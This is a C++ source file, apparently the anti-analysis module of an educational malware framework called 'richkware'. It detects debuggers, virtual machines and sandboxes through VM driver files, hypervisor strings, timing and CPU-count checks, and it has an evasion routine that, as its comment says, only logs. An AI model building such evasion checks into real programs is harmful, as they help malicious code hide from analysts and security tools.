#include "richkware/modules/anti_analysis.hpp"
#include "richkware/utils/logger.hpp"
#include <thread>
#include <chrono>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fstream>
#endif

namespace richkware::modules {

// AntiAnalysis implementation
class AntiAnalysis::Impl {
public:
    AntiAnalysisResult detect_analysis() {
        AntiAnalysisResult result;

        result.debugger_detected = is_debugger_present();
        result.virtual_machine_detected = is_virtual_machine();
        result.sandbox_detected = is_sandbox();

        if (result.debugger_detected) {
            result.detection_methods.push_back("debugger_present");
        }
        if (result.virtual_machine_detected) {
            result.detection_methods.push_back("virtual_machine");
        }
        if (result.sandbox_detected) {
            result.detection_methods.push_back("sandbox");
        }

        return result;
    }

    bool is_debugger_present() {
#ifdef _WIN32
        return IsDebuggerPresent();
#else
        // Check if being traced (Linux)
        int status = 0;
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            exit(0);
        } else if (pid > 0) {
            waitpid(pid, &status, 0);
        }
        return false; // Simplified
#endif
    }

    bool is_virtual_machine() {
#ifdef _WIN32
        // Check for VM artifacts
        const char* vm_files[] = {
            "C:\\windows\\system32\\vmGuestLib.dll",
            "C:\\windows\\system32\\VBoxHook.dll"
        };

        for (const auto* file : vm_files) {
            if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }

        // Check registry for VM keys (simplified)
        return false;

#else
        // Check for Linux VM artifacts
        std::ifstream cpuinfo("/proc/cpuinfo");
        std::string line;
        while (std::getline(cpuinfo, line)) {
            if (line.find("hypervisor") != std::string::npos ||
                line.find("vmware") != std::string::npos ||
                line.find("virtualbox") != std::string::npos) {
                return true;
            }
        }

        // Check for VM files
        const char* vm_files[] = {
            "/sys/devices/virtual/dmi/id/product_name",
            "/proc/scsi/scsi"
        };

        for (const auto* file : vm_files) {
            if (access(file, F_OK) == 0) {
                std::ifstream f(file);
                std::string content((std::istreambuf_iterator<char>(f)),
                                  std::istreambuf_iterator<char>());
                if (content.find("VMware") != std::string::npos ||
                    content.find("VirtualBox") != std::string::npos ||
                    content.find("QEMU") != std::string::npos) {
                    return true;
                }
            }
        }

        return false;
#endif
    }

    bool is_sandbox() {
        // Check for sandbox indicators
        auto start_time = std::chrono::steady_clock::now();

        // Sleep to detect timing attacks
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

        auto end_time = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

        // If sleep took much longer than expected, might be sandboxed
        if (duration.count() > 100) {  // More than 100ms for 10ms sleep
            return true;
        }

        // Check for limited resources
#ifdef _WIN32
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        if (sysinfo.dwNumberOfProcessors < 2) {
            return true;  // Likely sandboxed with limited CPU
        }
#else
        if (sysconf(_SC_NPROCESSORS_ONLN) < 2) {
            return true;  // Likely sandboxed with limited CPU
        }
#endif

        return false;
    }

    core::Result<void> evade_analysis() {
        // Add random delays to confuse automated analysis
        std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 1000));

        // Check for analysis and potentially exit or crash
        if (is_debugger_present() || is_virtual_machine() || is_sandbox()) {
            LOG_WARNING("Analysis environment detected, attempting evasion");

            // In real malware, this might trigger anti-analysis measures
            // For educational purposes, just log
        }

        return core::Result<void>{};
    }
};

AntiAnalysis::AntiAnalysis() : pimpl_(std::make_unique<Impl>()) {}
AntiAnalysis::~AntiAnalysis() = default;

AntiAnalysisResult AntiAnalysis::detect_analysis() {
    return pimpl_->detect_analysis();
}

bool AntiAnalysis::is_debugger_present() {
    return pimpl_->is_debugger_present();
}

bool AntiAnalysis::is_virtual_machine() {
    return pimpl_->is_virtual_machine();
}

bool AntiAnalysis::is_sandbox() {
    return pimpl_->is_sandbox();
}

core::Result<void> AntiAnalysis::evade_analysis() {
    return pimpl_->evade_analysis();
}

} // namespace richkware::modules